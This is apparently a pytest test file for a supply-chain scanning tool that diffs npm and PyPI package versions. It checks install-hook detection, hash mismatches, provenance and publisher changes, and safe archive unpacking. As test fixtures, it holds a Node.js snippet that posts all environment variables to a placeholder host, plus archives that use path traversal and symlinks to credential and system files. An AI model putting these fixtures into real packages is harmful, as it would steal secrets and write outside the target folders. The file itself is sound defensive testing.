"""`bombsquad diff`: registry metadata, hash checks, safe unpacking, and what a new version
gains.

No test touches the network: a fake registry serves package documents and archives built
in memory. Cases follow the roadmap's Phase 2: an update that adds an install hook that
collects secrets, a wheel that gains a `.pth` file, a release that loses provenance or
changes publisher, and archives that try to write outside their folder.
"""

from __future__ import annotations

import base64
import hashlib
import io
import json
import tarfile
import zipfile
from datetime import UTC, datetime

import pytest

from bombsquad.archive import ArchiveError, safe_name, unpack
from bombsquad.cli import main
from bombsquad.diff import diff_paths, diff_registry, parse_spec
from bombsquad.model import Level
from bombsquad.registry import FetchError, check_url

NOW = datetime(2026, 11, 27, 12, 0, tzinfo=UTC)
STEALER = (
    "const https = require('https');\n"
    "https.request('https://collect.example.invalid', {method: 'POST'})"
    ".end(JSON.stringify(process.env));\n"
)


def tarball(files: dict[str, str | bytes], prefix: str = "package/",
            links: dict[str, str] | None = None) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, content in files.items():
            data = content.encode() if isinstance(content, str) else content
            info = tarfile.TarInfo(prefix + name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
        for name, target in (links or {}).items():
            info = tarfile.TarInfo(prefix + name)
            info.type = tarfile.SYMTYPE
            info.linkname = target
            archive.addfile(info)
    return buffer.getvalue()


def wheel(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, content in files.items():
            archive.writestr(name, content)
    return buffer.getvalue()


def manifest(scripts: dict[str, str] | None = None) -> str:
    return json.dumps({"name": "demo", "version": "1.0.0", "scripts": scripts or {}})


class Registry:
    """Serves URLs from a dict, as the real registries would."""

    def __init__(self) -> None:
        self.urls: dict[str, bytes] = {}
        self.fetched: list[str] = []

    def __call__(self, url: str, limit: int) -> bytes:
        check_url(url)
        self.fetched.append(url)
        if url not in self.urls:
            raise FetchError(f"{url}: HTTP 404", 404)
        return self.urls[url]

    def npm(self, name: str, versions: dict[str, dict]) -> None:
        document = {"name": name, "versions": {}, "time": {}}
        for version, spec in versions.items():
            url = f"https://registry.npmjs.org/{name}/-/{name}-{version}.tgz"
            data = spec["tarball"]
            self.urls[url] = spec.get("served", data)
            dist = {"tarball": url, "integrity": "sha512-" + base64.b64encode(
                hashlib.sha512(data).digest()).decode()}
            if spec.get("provenance"):
                dist["attestations"] = {"url": "https://registry.npmjs.org/-/npm/v1/"
                                               "attestations/x", "provenance": {"predicateType":
                                                                                "slsa"}}
            document["versions"][version] = {
                "name": name, "version": version, "dist": dist,
                "_npmUser": {"name": spec.get("publisher", "alice"), "email": "a@example.invalid"},
                "maintainers": [{"name": n, "email": f"{n}@example.invalid"}
                                for n in spec.get("maintainers", ["alice"])]}
            for key in ("repository", "gitHead"):
                if key in spec:
                    document["versions"][version][key] = spec[key]
            document["time"][version] = spec["time"]
        self.urls[f"https://registry.npmjs.org/{name}"] = json.dumps(document).encode()


def test_parse_spec():
    assert parse_spec("npm:@scope/pkg@1.0.0..1.0.1") == ("npm", "@scope/pkg", "1.0.0", "1.0.1")
    assert parse_spec("pypi:agent-thing@0.9..1.0") == ("pypi", "agent-thing", "0.9", "1.0")
    for bad in ("npm:pkg@1.0.0", "cargo:x@1..2", "pkg@1..2", "npm:@1..2"):
        with pytest.raises(ValueError):
            parse_spec(bad)


def test_only_https_to_the_registries():
    check_url("https://registry.npmjs.org/demo")
    check_url("https://files.pythonhosted.org/packages/x.whl")
    for url in ("http://registry.npmjs.org/demo", "https://registry.npmjs.org.example.invalid/",
                "https://example.invalid/demo.tgz", "file:///etc/passwd"):
        with pytest.raises(FetchError):
            check_url(url)


def test_update_that_adds_an_install_hook_is_reported(tmp_path):
    registry = Registry()
    registry.npm("demo", {
        "1.0.0": {"tarball": tarball({"package.json": manifest(), "index.js": "exports.x=1;\n"}),
                  "time": "2026-10-01T10:00:00.000Z", "provenance": True},
        "1.0.1": {"tarball": tarball({
            "package.json": manifest({"postinstall": "node setup.js"}),
            "index.js": "exports.x=1;\n", "setup.js": STEALER}),
            "time": "2026-11-27T02:00:00.000Z", "publisher": "mallory",
            "maintainers": ["alice", "mallory"]}})
    report = diff_registry("npm:demo@1.0.0..1.0.1", registry, NOW)
    [entry] = report.added_entries
    assert entry.kind == "postinstall script" and entry.path == "package.json"
    assert entry.targets == ["setup.js"]
    assert {f.rule.id for f in report.added_findings} >= {"BS-EX-001", "BS-ENV-001",
                                                          "BS-NET-003"}
    assert report.added_findings[0].level is Level.HIGH
    assert report.added_files == ["setup.js"]
    assert {s.id for s in report.signals} == {"publisher-changed", "maintainers-changed",
                                              "provenance-missing", "recent-release"}
    recent = next(s for s in report.signals if s.id == "recent-release")
    assert "10 hours" in recent.detail
    assert report.highest_level() is Level.HIGH
    data = report.to_dict()
    assert data["new"]["publisher"] == "mallory" and data["old"]["provenance"] is True
    assert "example.invalid" not in json.dumps(data["new"])  # maintainer emails are not kept


def test_unchanged_findings_are_not_reported_again(tmp_path):
    registry = Registry()
    hook = {"package.json": manifest({"postinstall": "node setup.js"}), "setup.js": STEALER}
    moved = dict(hook, **{"setup.js": "// moved down a line\n" + STEALER})
    registry.npm("demo", {"1.0.0": {"tarball": tarball(hook), "time": "2026-01-01T00:00:00Z"},
                          "1.0.1": {"tarball": tarball(moved), "time": "2026-02-01T00:00:00Z"}})
    report = diff_registry("npm:demo@1.0.0..1.0.1", registry, NOW)
    assert report.added_findings == [] and report.added_entries == []
    assert [s.id for s in report.signals] == ["release-age"]
    assert report.highest_level() is Level.INFO


def test_artifact_that_does_not_match_the_registry_hash_is_not_opened(tmp_path):
    registry = Registry()
    good = tarball({"package.json": manifest()})
    registry.npm("demo", {
        "1.0.0": {"tarball": good, "time": "2026-01-01T00:00:00Z"},
        "1.0.1": {"tarball": good, "served": tarball({"package.json": manifest(
            {"preinstall": "node x.js"})}), "time": "2026-02-01T00:00:00Z"}})
    with pytest.raises(FetchError, match="does not match the registry"):
        diff_registry("npm:demo@1.0.0..1.0.1", registry, NOW)


def test_missing_version(tmp_path):
    registry = Registry()
    registry.npm("demo", {"1.0.0": {"tarball": tarball({"package.json": manifest()}),
                                    "time": "2026-01-01T00:00:00Z"}})
    with pytest.raises(FetchError, match="not in the npm registry"):
        diff_registry("npm:demo@1.0.0..9.9.9", registry, NOW)


def test_wheel_that_gains_a_pth_file(tmp_path):
    registry = Registry()
    base = "https://files.pythonhosted.org/packages"
    files = {
        "1.0": {"sdist": tarball({"setup.py": "from setuptools import setup\nsetup()\n"},
                                 prefix="agent-thing-1.0/"),
                "wheel": wheel({"agent_thing/__init__.py": ""})},
        "1.1": {"sdist": tarball({"setup.py": "from setuptools import setup\nsetup()\n"},
                                 prefix="agent-thing-1.1/"),
                "wheel": wheel({"agent_thing/__init__.py": "",
                                "agent_thing_init.pth": "import agent_thing._boot\n"})},
    }
    for version, artifacts in files.items():
        urls = []
        for kind, data in artifacts.items():
            filename = (f"agent_thing-{version}-py3-none-any.whl" if kind == "wheel"
                        else f"agent_thing-{version}.tar.gz")
            url = f"{base}/{filename}"
            registry.urls[url] = data
            urls.append({"filename": filename, "url": url,
                         "packagetype": "bdist_wheel" if kind == "wheel" else "sdist",
                         "digests": {"sha256": hashlib.sha256(data).hexdigest()},
                         "upload_time_iso_8601": f"2026-{10 if version == '1.0' else 11}"
                                                 "-01T00:00:00.000Z"})
            if version == "1.0":
                registry.urls[f"https://pypi.org/integrity/agent-thing/{version}/{filename}/"
                              "provenance"] = json.dumps({"attestation_bundles": [{}]}).encode()
        registry.urls[f"https://pypi.org/pypi/agent-thing/{version}/json"] = json.dumps(
            {"info": {"project_urls": {"Source": "https://github.com/example/agent-thing"}},
             "urls": urls}).encode()
    report = diff_registry("pypi:agent-thing@1.0..1.1", registry, NOW)
    assert [(e.kind, e.path) for e in report.added_entries] == [
        (".pth import line", "wheel/agent_thing_init.pth")]
    assert "BS-EP-001" in {f.rule.id for f in report.added_findings}
    assert report.changed_entries == []  # setup.py lines up across sdist folders
    assert {s.id for s in report.signals} == {"provenance-missing", "release-age"}


def test_minified_blob_and_local_paths(tmp_path):
    old, new = tmp_path / "old", tmp_path / "new"
    for root in (old, new):
        root.mkdir()
        (root / "package.json").write_text(manifest(), encoding="utf-8")
        (root / "index.js").write_text("module.exports = 1;\n", encoding="utf-8")
    (new / "index.js").write_text("module.exports = 1;\n" + "var a=1;" * 200 + "\n",
                                  encoding="utf-8")
    (new / "data.json").write_text("[" + "1," * 1000 + "1]\n", encoding="utf-8")
    report = diff_paths(old, new)
    assert [path for path, _ in report.grew] == ["index.js"]  # data files are not code
    assert report.signals == []


def test_cli_diff_of_two_archives(tmp_path, capsys):
    old = tmp_path / "demo-1.0.0.tgz"
    new = tmp_path / "demo-1.0.1.tgz"
    old.write_bytes(tarball({"package.json": manifest()}))
    new.write_bytes(tarball({"package.json": manifest({"preinstall": "node a.js"}),
                             "a.js": STEALER}))
    assert main(["diff", str(old), str(new), "--fail-on", "high"]) == 1
    text = capsys.readouterr().out
    assert "New or changed entry points" in text and "preinstall script" in text
    assert "No new findings does not mean safe." in text
    assert main(["diff", str(old), str(old), "--format", "json", "--fail-on", "review"]) == 0
    data = json.loads(capsys.readouterr().out)
    assert data["kind"] == "diff" and data["findings"]["added"] == []


# Unpacking --------------------------------------------------------------------------------

@pytest.mark.parametrize(("name", "expected"), [
    ("package/index.js", "package/index.js"),
    ("./package//lib/./a.js", "package/lib/a.js"),
    ("package/../../evil.js", None),
    ("/etc/passwd", None),
    ("C:/Windows/evil.dll", None),
    ("package\\..\\evil.js", None),
    ("package/con.js", None),
    ("package/a:b.js", None),
    ("package/trailing.", None),
])
def test_safe_names(name, expected):
    assert safe_name(name) == expected


def test_unpacking_skips_links_and_escapes(tmp_path):
    data = tarball({"index.js": "1;\n", "../../outside.js": "2;\n", "INDEX.js": "3;\n"},
                   links={"creds": "/home/user/.npmrc"})
    root, notes = unpack(data, "demo.tgz", tmp_path / "out")
    assert root == (tmp_path / "out" / "package").resolve()
    assert sorted(p.name for p in root.iterdir()) == ["index.js"]
    assert not (tmp_path / "outside.js").exists()
    assert len(notes) == 3  # the escape, the case clash and the link
    zipped = io.BytesIO()
    with zipfile.ZipFile(zipped, "w") as archive:
        archive.writestr("../evil.py", "x")
        link = zipfile.ZipInfo("pkg/link")
        link.external_attr = 0o120777 << 16
        archive.writestr(link, "/etc/passwd")
        archive.writestr("pkg/ok.py", "x = 1\n")
    root, notes = unpack(zipped.getvalue(), "x.whl", tmp_path / "zip")
    assert [p.name for p in root.rglob("*") if p.is_file()] == ["ok.py"]
    assert len(notes) == 2


def test_unpacking_stops_at_the_size_limit(tmp_path, monkeypatch):
    monkeypatch.setattr("bombsquad.archive.MAX_TOTAL_BYTES", 1000)
    with pytest.raises(ArchiveError, match="when unpacked"):
        unpack(tarball({"big.js": "x" * 5000}), "big.tgz", tmp_path / "out")


def test_corrupt_archive(tmp_path):
    with pytest.raises(ArchiveError):
        unpack(b"not an archive", "bad.tgz", tmp_path / "out")
